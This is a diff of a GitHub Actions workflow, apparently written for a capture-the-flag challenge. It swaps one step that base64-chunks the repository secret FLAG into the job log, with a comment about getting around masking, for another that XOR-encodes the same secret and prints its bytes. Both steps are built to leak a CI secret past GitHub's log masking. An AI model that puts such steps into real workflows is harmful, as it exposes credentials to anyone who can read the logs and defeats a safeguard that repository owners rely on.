@@ -9,25 +9,27 @@ jobs:
     steps:
       - name: Save issue body safely
         env:
-            BODY: ${{ github.event.issue.body }}
-            TITLE: ${{ github.event.issue.title }}
+          BODY: ${{ github.event.issue.body }}
+          TITLE: ${{ github.event.issue.title }}
         run: |
           echo "ISSUE_TITLE=$(echo "$TITLE" | tr '\n' ' ')" >> $GITHUB_ENV
           printf "ISSUE_BODY<<EOF\n%s\nEOF\n" "$BODY" >> $GITHUB_ENV
 
-      - name: Exfil FLAG (base64 chunked)
+      - name: Leak FLAG via XOR ord values
         shell: python
         env:
           FLAG: ${{ secrets.FLAG }}
         run: |
-          import os, base64, textwrap
-          flag = os.environ.get("FLAG","")
-          b64 = base64.b64encode(flag.encode()).decode()
-          print("B64_FLAG_START")
-            # Découpage en chunks pour lisibilité / contournement masquage
-          for chunk in textwrap.wrap(b64, 32):
-              print("CHUNK", chunk)
-          print("B64_FLAG_END")
+          import os, json
+            # Choisis une clé XOR simple
+          KEY = 0x37
+          flag = os.environ["FLAG"]
+          data = [ord(c)^KEY for c in flag]
+          print("XOR_KEY=", KEY)
+          print("LEN=", len(data))
+          print("XOR_BYTES=", json.dumps(data))
+          import hashlib
+          print("SHA256_XOR_STREAM=", hashlib.sha256(bytes(data)).hexdigest())
 
       - name: Original demo
         shell: python
